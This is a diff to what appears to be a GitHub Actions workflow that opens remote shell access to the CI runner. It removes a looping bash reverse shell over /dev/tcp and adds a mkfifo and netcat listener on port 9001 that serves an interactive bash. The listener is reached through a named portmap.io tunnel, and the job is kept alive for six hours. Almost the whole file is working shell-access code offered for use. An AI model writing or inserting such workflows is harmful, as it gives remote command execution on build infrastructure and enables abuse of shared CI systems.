@@ -1,4 +1,4 @@
-name: Bash Reverse Shell with Portmap.io (Updated Tunnel - Download OVPN)
+name: Bash Reverse Shell with Portmap.io (Updated Tunnel - Listening Shell)
 
 on:
   push:
@@ -43,22 +43,18 @@ jobs:
           echo "=== Tunnel Endpoint ==="
           echo "tcp://vpsfree9009-22216.portmap.io:22216"
 
-      - name: Start Bash Reverse Shell
+      - name: Start Bash Reverse Shell (Listening)
         run: |
-          echo "=== Starting reverse shell ==="
-          # Test connectivity to localhost:9001
-          nc -zv localhost 9001 || echo "Cannot connect to localhost:9001"
-          # Start reverse shell with reconnection loop
-          while true; do
-            /bin/bash -i >& /dev/tcp/localhost/9001 0>&1
-            sleep 10
-          done &
+          echo "=== Starting reverse shell (listening) ==="
+          # Start netcat in listening mode on port 9001 and execute bash upon connection
+          mkfifo /tmp/backpipe
+          /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
           sleep 5
-          ps aux | grep '[b]ash' || echo "No bash reverse shell process found"
-          echo "=== Reverse shell started, connect to tcp://vpsfree9009-22216.portmap.io:22216 ==="
+          ps aux | grep '[n]c -lvnp 9001' || echo "Netcat listening process not found"
+          echo "=== Netcat is listening on port 9001. Connect to tcp://vpsfree9009-22216.portmap.io:22216 from your local machine ==="
           # Keep workflow alive for 6 hours
           for i in {1..360}; do
-            ps aux | grep '[b]ash' || echo "Reverse shell process stopped"
+            ps aux | grep '[n]c -lvnp 9001' || echo "Netcat listening process stopped"
             ps aux | grep '[o]penvpn' || echo "OpenVPN process stopped"
             sleep 60
           done
